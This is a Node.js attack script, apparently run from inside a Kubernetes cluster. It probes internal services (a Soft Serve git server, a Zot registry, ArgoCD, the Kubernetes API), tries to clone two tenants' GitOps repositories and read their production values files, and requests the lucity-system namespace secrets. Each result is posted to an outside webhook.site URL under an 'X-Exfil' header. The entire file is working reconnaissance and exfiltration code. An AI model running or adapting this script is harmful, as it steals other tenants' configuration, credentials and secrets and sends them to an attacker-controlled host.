const https = require('https');
const http = require('http');
const { execSync } = require('child_process');

const WEBHOOK = "https://webhook.site/d16fa166-2948-4505-96c0-f67e0db0843d";

function post(label, data) {
  return new Promise((resolve) => {
    const u = new URL(WEBHOOK);
    const req = https.request({
      hostname: u.hostname, port: 443, path: u.pathname,
      method: 'POST', headers: { 'Content-Type': 'text/plain', 'X-Exfil': label },
      timeout: 15000
    }, (res) => { res.on('data', () => {}); res.on('end', resolve); });
    req.on('error', resolve);
    req.on('timeout', () => { req.destroy(); resolve(); });
    req.write(typeof data === 'string' ? data : JSON.stringify(data, null, 2));
    req.end();
  });
}

function run(cmd) {
  try { return execSync(cmd, { timeout: 10000 }).toString(); } 
  catch(e) { return e.stderr?.toString() || e.message; }
}

async function main() {
  await post('v2-start', new Date().toISOString());

  // 1. Direct soft-serve probe
  let ss = '';
  ss += 'HTTP 23232:\n' + run('curl -s -m5 http://lucity-infra-soft-serve.lucity-system.svc.cluster.local:23232/ 2>&1') + '\n';
  ss += 'REPOS:\n' + run('curl -s -m5 http://lucity-infra-soft-serve.lucity-system.svc.cluster.local:23232/repos 2>&1') + '\n';
  ss += 'GIT REFS zeitlos:\n' + run('curl -s -m5 "http://lucity-infra-soft-serve.lucity-system.svc.cluster.local:23232/zeitlos-software-beast-gitops.git/info/refs?service=git-upload-pack" 2>&1') + '\n';
  ss += 'GIT REFS cblaettl:\n' + run('curl -s -m5 "http://lucity-infra-soft-serve.lucity-system.svc.cluster.local:23232/cblaettl-epic-falcon-gitops.git/info/refs?service=git-upload-pack" 2>&1') + '\n';
  await post('softserve', ss);

  // 2. Try anonymous git clone of zeitlos repo
  let clone = run('git clone http://lucity-infra-soft-serve.lucity-system.svc.cluster.local:23232/zeitlos-software-beast-gitops.git /tmp/z-clone 2>&1');
  await post('clone-zeitlos', clone);
  
  // If clone worked, dump contents
  let zFiles = run('find /tmp/z-clone -type f 2>/dev/null | head -30');
  if (zFiles.trim()) {
    await post('zeitlos-files', zFiles);
    let vals = run('cat /tmp/z-clone/environments/production/values.yaml 2>/dev/null');
    await post('zeitlos-prod-values', vals);
  }

  // 3. Try cloning cblaettl
  let clone2 = run('git clone http://lucity-infra-soft-serve.lucity-system.svc.cluster.local:23232/cblaettl-epic-falcon-gitops.git /tmp/c-clone 2>&1');
  await post('clone-cblaettl', clone2);
  if (run('ls /tmp/c-clone 2>/dev/null').trim()) {
    await post('cblaettl-files', run('find /tmp/c-clone -type f 2>/dev/null | head -30'));
    await post('cblaettl-values', run('cat /tmp/c-clone/environments/production/values.yaml 2>/dev/null'));
  }

  // 4. Zot registry - already confirmed but double check
  let zot = run('curl -s -m5 http://lucity-infra-zot.lucity-system.svc:5000/v2/_catalog 2>&1');
  await post('zot-catalog', zot);

  // 5. ArgoCD - try without auth
  let argo = '';
  argo += 'VERSION:\n' + run('curl -s -m5 http://lucity-infra-argocd-server.lucity-system.svc.cluster.local/api/version 2>&1') + '\n';
  argo += 'APPS:\n' + run('curl -s -m5 http://lucity-infra-argocd-server.lucity-system.svc.cluster.local/api/v1/applications 2>&1') + '\n';
  argo += 'SETTINGS:\n' + run('curl -s -m5 http://lucity-infra-argocd-server.lucity-system.svc.cluster.local/api/v1/settings 2>&1') + '\n';
  await post('argocd', argo);

  // 6. K8s API
  let k8s = run('curl -sk -m5 https://kubernetes.default.svc/version 2>&1');
  await post('k8s-version', k8s);

  // 7. Try K8s secrets
  let secrets = run('curl -sk -m5 https://kubernetes.default.svc/api/v1/namespaces/lucity-system/secrets 2>&1');
  await post('k8s-secrets', secrets.substring(0, 5000));

  await post('v2-done', 'complete');
  console.log('done');
}

main().catch(console.error);
